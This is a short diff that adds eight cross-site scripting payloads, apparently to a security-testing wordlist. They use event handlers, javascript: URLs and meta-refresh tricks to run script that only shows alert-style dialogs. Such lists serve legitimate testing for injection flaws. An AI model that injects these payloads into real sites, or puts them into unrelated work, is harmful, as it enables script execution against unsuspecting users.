@@ -1,0 +1,8 @@
+<svg/onload=prompt(1)>
+<details open ontoggle=confirm(1)>
+<math href="javascript:alert(1)">Click Me</math>
+<video src=x onerror=alert('XSS')></video>
+<xss style="behavior:url(#default#xss);">XSS</xss>
+<base href="javascript:alert('XSS');//">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<script>alert(document.domain)</script>
